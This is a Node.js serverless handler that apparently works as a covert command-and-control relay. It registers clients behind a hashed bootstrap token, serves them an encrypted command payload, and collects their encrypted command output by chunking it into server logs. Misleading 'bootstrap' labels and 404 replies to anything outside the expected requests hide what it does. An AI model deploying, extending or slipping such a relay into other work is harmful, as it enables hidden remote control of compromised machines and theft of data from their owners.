import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '24';
const CONTROL_PAYLOAD = 'U2FsdGVkX1+NSSk9Evcqni/uP+N8wrIigKJquPRgnlguFNXwfG4rmLhKzI2tMJeG7lgMP2pesPcH/qPgDNDFJt7CuADAP8J8Ls+dllNjfF5Axob/L6eXHlUtCcNqjKdUbdgYmjPHwFeEtF17OjUsgcdqo1l1anmeHmr36//QWM2WHvzJCsNT7kFe8Q+JZ42O52kKgcXyBQVwXmMwufX/B7AW1eXaWRcpNhaOVbmPw2x1SGuNs2+4PSncOtUHzpzGYziDlcVlz3+sIDxr7G/aeA0nad8B7L3kugrEah+4nMY4BxQsZQiq8l5M0Cr0ePfrLaWkYwzRgay36CR4axp0Ru9Ys4zWq8VjobYy1v7mvzabClvJxySN7cIZNA7qQ195xkWFmDbClXC3M7N6LYk4EECo2W+9XUSM7b9dfFg7/bybx6BiL/yClV9n4TSZHvAq+r8T4f519DOLCrSJeQ9UNBRHQvX5n7p7wxxDcmA61Vh3+p1MqduGdt0prdl6eXY6OvhsRsPFY9d0XjKVT9Xkl/uDpWRd1fO7Tmc+RUgRXPsZNTDdvr6N82rE6ToeELmN0Jn8J0zdk6XSPqh63z8jbPWerJT1WGso+SP9N+Qw1YhAJnetFnovyv/Hsnkwnrt0W0pRSTwsGqbQdwSrXqVgWTj75LbkhHCy2okztg9oW1IiXyewfWvHSqVumJ5e4R+4keIX1pTeYOWIm6PvBbCBN6fuuCP/onpw7co4WE8IidQv9XagkPEF86KW+WmgNlMUERmdTjzB/uAq4jvUoYwuiphcRNtgS9m8BbKP2Y4vqJF5RR1U4NzG7oXgI0J6fIbpQ6wR3qbhTp6eh6zx0tl8nmPBfD5IwbSODSB5HXzhd3RR4RHeR6V7MGgCLEH/nG8bNpY2vumIwUMIlMvFDv58XI5ojEucsDQt1CdhQCIkR7gUASUJNwaysMkRvsBYj1dsYXAx/ijMwjPBGjZiFM592v1t3QKh7Xv8oUrFj1YNmQTKS1tTlQsxeT46e+x80x2YWwRrZSUGF7Kr8Krx2r2eLQ==';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
